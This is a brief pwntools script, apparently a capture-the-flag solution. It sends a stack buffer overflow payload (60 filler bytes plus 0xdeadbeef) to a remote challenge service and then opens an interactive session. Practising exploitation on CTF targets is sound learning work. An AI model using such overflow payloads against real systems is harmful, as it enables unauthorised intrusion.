from pwn import *

elf = "./cats_KIFg4OV"
context.binary = elf
context.log_level = "debug"

# r = process(elf)
r = remote("9d17425.678470.xyz", 32394)

r.recvuntil(b"cats?")
payload = flat(
    b"A" * 60,
    p64(0xdeadbeef)
)
info("payload: %s" % payload)
r.sendline(payload)
r.interactive()